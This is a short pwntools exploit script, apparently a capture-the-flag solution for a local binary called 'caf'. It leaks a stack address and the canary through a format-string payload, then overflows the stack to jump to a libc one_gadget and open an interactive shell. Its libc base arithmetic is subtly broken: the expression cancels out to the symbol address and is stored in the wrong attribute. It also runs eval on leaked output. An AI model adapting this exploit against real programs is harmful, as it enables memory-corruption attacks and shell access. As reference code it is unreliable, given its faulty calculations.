from pwn import *

context(terminal = ["tmux","splitw","-h"], os="linux", arch ="amd64")
proc = process("./caf")
libc = proc.libc
proc.recv()
payload = b"%p "*39
proc.sendline(payload)
All = proc.recv()
Leak = eval(All[30:30+14].decode())
Canary = int(All[462:462+18].decode(), 16)
log.info("Leak: "+ hex(Leak))
log.info("Canary: "+ hex(Canary))
libc.addr = Leak - (Leak - libc.sym['__libc_start_main'])
log.info("Libc Base Address :"+ hex(libc.address))
#gdb.attach(proc)
payload = b"X"*264+p64(Canary)+p64(0)+p64(libc.address + 0xe6c81)
proc.sendline(payload)
proc.interactive()
